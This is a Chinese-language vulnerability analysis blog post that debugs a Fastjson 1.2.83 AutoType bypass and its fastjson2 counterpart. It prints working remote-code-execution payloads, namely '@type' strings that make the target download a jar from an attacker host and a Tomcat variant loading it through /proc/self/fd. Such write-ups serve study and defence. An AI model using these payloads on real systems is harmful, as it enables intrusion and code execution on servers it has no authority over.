---
title: "Fastjson 1.2.83 &&2 漏洞分析"
date: 2026-07-27
draft: false
tags: ["Java安全", "Fastjson", "漏洞分析"]
summary: "Fastjson 1.2.83 调试复现、AutoType 检查与不同容器下利用差异分析"
---

### Background

听说这个消息就赶快进行一些复现和调试，写下一些与AI结合的分析和思路

### part 0.环境搭建

以前这会是一个需要最起码30分钟的过程，现在有ai 开一个remote debug 可能大概10分钟就可以了
![Pasted image 20260723095816](Pasted%20image%2020260723095816.png)
大概需要ai提供的 一个可以直接启动的docker-compose.yml就可以了 就不多说了
然后让ai写一个解析json的控制器就好了
![Pasted image 20260723100150](Pasted%20image%2020260723100150.png)

### part 0.5  以前漏洞分析 && debug开始

可以先随便设置一个type 打过去看看
![Pasted image 20260723100544](Pasted%20image%2020260723100544.png)
可以注意到会走过
![Pasted image 20260723100648](Pasted%20image%2020260723100648.png)
几个parse 会到我们第一个比较关注的地方 parseObject
先拉到最底下会看到一个getDesrializer
![Pasted image 20260723111737](Pasted%20image%2020260723111737.png)

跟进后 可以看到有一个createJavaBeanDeserializer
![Pasted image 20260723112014](Pasted%20image%2020260723112014.png)
跟一下 JavaBeanInfo.build
![Pasted image 20260723112541](Pasted%20image%2020260723112541.png)
在这里你会看到它识别type后面的类 
![Pasted image 20260723141826](Pasted%20image%2020260723141826.png)
获取这个类所有的方法  而且判断了长度 和set开头 这个就是我们以前经典的 漏洞原理了
但这个洞确实还是有些不同 
这个洞首先需要跟进checkAutotype
那我们前面的测试poc发现是进不去的 为什么呢？
![Pasted image 20260723145955](Pasted%20image%2020260723145955.png)
我前面测试的时候随便写一个HashMap 他在这里会直接赋值不会走进下面的checkAutoType
所以真正我们测试的poc 可以用这个
```
{"@type":"foo.Exception","x":1}
```

发送poc
找到DefaultJsonParser的parseObject
找到checkAutoType 打上断点跟进来就行
## part1.漏洞分析
![Pasted image 20260723153449](Pasted%20image%2020260723153449.png)
跟进的时候会看见他会来看safemode开没开启如果开启的话直接就会throw Exception
所以这就是为什么修复建议是开启safemode

然后继续走 会看见他会检测类名长度 
![Pasted image 20260723154821](Pasted%20image%2020260723154821.png)
往下跟可以看见 完整的检测恶意类的方法

![Pasted image 20260723161118](Pasted%20image%2020260723161118.png)
首先在这里  fullHash 表示整个类名的 FNV1a 哈希 他会判断完整类名是否在 Fastjson 内置白名单中。
往下看 他是在不断循环计算 前缀哈希  这样可以拦截类似危险包名前缀
![Pasted image 20260723161336](Pasted%20image%2020260723161336.png)
满足条件会进入下面的白黑名单校验
![Pasted image 20260723161616](Pasted%20image%2020260723161616.png)
不是内置白名单并且autoTypeSupport == true或者expectClassFlag == true
在我们这里 autoTypeSupport = false  expectClassFlag = false
所以就跳过这一大串 随便debug两下就到了
![Pasted image 20260723165902](Pasted%20image%2020260723165902.png)
在这里可以说整个漏洞的关键
![Pasted image 20260723170128](Pasted%20image%2020260723170128.png)
首先他会把我们输入的.进行替换

![Pasted image 20260723170413](Pasted%20image%2020260723170413.png)

会看见会走进getResourceAsStream 也就是它是通过这个来读取文件的

![Pasted image 20260723171129](Pasted%20image%2020260723171129.png)
在这里我们就可以看到一个奇怪的jar 也就是其实getResouceAsStream是可以读jar文件的
那是不是意味着它可以支持jar协议呢
我们打一个```{"@type":"jar://127.0.0.1:8888","x":1}```
过去

![Pasted image 20260723171353](Pasted%20image%2020260723171353.png)
可以看到他被替换掉了 那也简单 我们用.替代回去就好了 
//我就可以用. 那ip本身的.也比较简单 我们可以使用ssrf的一个小知识点 对ip进行编码
那么在这里可以停一下 在思考下 jar协议本身什么意思 读取jar的意思 那我们实际上需要做什么？
参考jndi漏洞利用原理 所以我们需要两层协议 用http给他下载下来 再用jar协议读取
所以我们构造poc如下
```
jar:http:..2130706433:8099.probe
```
打一下
![Pasted image 20260723172422](Pasted%20image%2020260723172422.png)
你可以看到这里我们debug处其实就获得到一个正确的请求了
那我们可以这样 先做一个jar包 开启一个jar服务
![Pasted image 20260723173847](Pasted%20image%2020260723173847.png)
开启一个 python可以看到能够成功接收到请求

![Pasted image 20260723173432](Pasted%20image%2020260723173432.png)
而且在这里is你会发现他不是null 可以直接跟进来了

![Pasted image 20260723173731](Pasted%20image%2020260723173731.png)

跟进ClassReader
![Pasted image 20260724104723](Pasted%20image%2020260724104723.png)
读完类之后
![Pasted image 20260724111550](Pasted%20image%2020260724111550.png)
会直接loadClass
在这里你会看见Class.forName
![Pasted image 20260724111852](Pasted%20image%2020260724111852.png)
 编写恶意代码块执行就可以了？
 -----------------------------------------分割线------------------------------------------
 答案是否定的  在debug里面是不可以想当然的
在这里clazz类会进行 loadclass
![Pasted image 20260724155548](Pasted%20image%2020260724155548.png)
提前就返回了，所以说他不是在TypeUtils里 而是在我们的LaunchedURLClassLoader里

 那你继续跟进其实会发现
 ![Pasted image 20260724162223](Pasted%20image%2020260724162223.png)
resolve为false   所以实际上不会在这里执行

 ![Pasted image 20260724162517](Pasted%20image%2020260724162517.png)
 跟进在这里会发现有一个我们前面提到的deserializer
 ![Pasted image 20260724162706](Pasted%20image%2020260724162706.png)

在这里你会发现有一个createInstance 所以说实际堆栈
  TypeUtils.loadClass 返回 clazz

  → getDeserializer(clazz)

  → deserialze

  → constructor.newInstance

  → Exploit.static {}
（debug的时候笔者是以实际poc进行调试 带大家看如何找到的 所以可能会有点影响连续性 ）
但我们这里还到了最后一步
![Pasted image 20260724111923](Pasted%20image%2020260724111923.png)
变量这里可以看到className 但我们开的是一个jar 那么怎么能从jar包里表示class呢？
这个时候就可以考虑问ai
![Pasted image 20260724112230](Pasted%20image%2020260724112230.png)
知道是感叹号后 我们就可以构造poc了
首先编写恶意类
![Pasted image 20260724112424](Pasted%20image%2020260724112424.png)
关键代码如上 然后
![Pasted image 20260724112657](Pasted%20image%2020260724112657.png)

### part2. 适配 Tomcat
在测试的时候 会发现undertow容器和jetty都可以打通的 但是tomcat不行
走原来debug路找差异
![Pasted image 20260724163348](Pasted%20image%2020260724163348.png)

你可以看到这里classLoader 发生了改变
跟下去你会发现这里面有一个奇怪的点
![Pasted image 20260724163820](Pasted%20image%2020260724163820.png)
你对loadClass按f7 会走进下面 说明什么？
说明他被catch 的异常吞掉了
![Pasted image 20260724165648](Pasted%20image%2020260724165648.png)
添加几个异常断点
![Pasted image 20260724165701](Pasted%20image%2020260724165701.png)
可以看到报错了class not found
跟进下面
![Pasted image 20260724170419](Pasted%20image%2020260724170419.png)
你会发现clazz 还是 null
所以我们就要思考 到底哪儿出现问题了 
其实要么就是1.无法被识别为类 2.文件读取有问题 也就是未取到jar包
我们可以试试
![Pasted image 20260724171134](Pasted%20image%2020260724171134.png)
你会发现is是访问的
也就说答案是1
Tomcat classloader 不接受这个 jar:http...!/Exploit 类型名作为可加载类
那我们就要回到classLoader里
![Pasted image 20260724174215](Pasted%20image%2020260724174215.png)
看看他的classLoader的名字
![Pasted image 20260724175119](Pasted%20image%2020260724175119.png)
跟进他这个doLoadClass
![Pasted image 20260724175152](Pasted%20image%2020260724175152.png)
看到有一个loadFromParent 继续跟一下
![Pasted image 20260724175323](Pasted%20image%2020260724175323.png)
Class.forName(name, false, parent) 也会返回null
![Pasted image 20260724175616](Pasted%20image%2020260724175616.png)
所以他会走进下一个findclass
![Pasted image 20260724182530](Pasted%20image%2020260724182530.png)
继续跟进到这里 发现path有一个binaryNametoPath
![Pasted image 20260724182651](Pasted%20image%2020260724182651.png)
这里会进行一次替换
大概率会变成：
```
 jar:http://exp-host:9099/probe_xxx!/Exploit.class

  因为：

  jar:http:..exp-host:9099.probe_xxx!.Exploit

  点号替换成 / 后就是：

  jar:http://exp-host:9099/probe_xxx!/Exploit

  再加：

  .class

  得到：

  jar:http://exp-host:9099/probe_xxx!/Exploit.class

```

这也就是  LaunchedURLClassLoader 和 TomcatEmbeddedWebappClassLoader的区别了
问了一下ai
![Pasted image 20260727101253](Pasted%20image%2020260727101253.png)
他说Class.forName不接受 //
但是有个有意思的现象就是
jar包本质是压缩包 所以jvm打开jar包就会分配一个fd符号 有没有可能可以这样读到jar呢
那我们试试就知道了

`payload: {"@type":"jar:http:..exp-host:19999.probe_47080!.foo.Foo","x":1}`
然后我们找到了
![Pasted image 20260727103119](Pasted%20image%2020260727103119.png)
可以找到他具体是fd多少
接下来就是jar协议如何本地加载了

![Pasted image 20260727143520](Pasted%20image%2020260727143520.png)
随便问问ai就知道可以
然后因为前面我们知道 //是不可以的
但是file协议可以
file:/proc/self/fd/ 这样
所以 我们可以直接 
构造poc
```
jar:file:/proc/self/fd/32!/fd32/Foo.class
```
第二次调用poc如下
```
{"@type":"jar:file:.proc.self.fd.32!.fd32.Foo","x":1}
```
![Pasted image 20260727144647](Pasted%20image%2020260727144647.png)
RCE成功了

### part3 fastjson2 🤔?
刚写完发出来发现爆出来2了？
https://github.com/alibaba/fastjson2/pull/7695/changes
但长亭写了描述

fastjson2 默认不开启 autotypesupport
![Pasted image 20260727162321](Pasted%20image%2020260727162321.png)

所以只能走这里
![Pasted image 20260727163524](Pasted%20image%2020260727163524.png)
问问ai他说是可以爆破的
![Pasted image 20260727163715](Pasted%20image%2020260727163715.png)
完全ai写一个 就行了
比较有意思的是fastjson2 里 **TypeUtils.loadClass**
![Pasted image 20260727163913](Pasted%20image%2020260727163913.png)

所以在fastjson2里 即使tomcat也一发就入魂了
### part4 后记&&未完待续
还可以不用fd的思路
想写再说吧
第一次写这种基础调试+AI+思考的文章
记录一下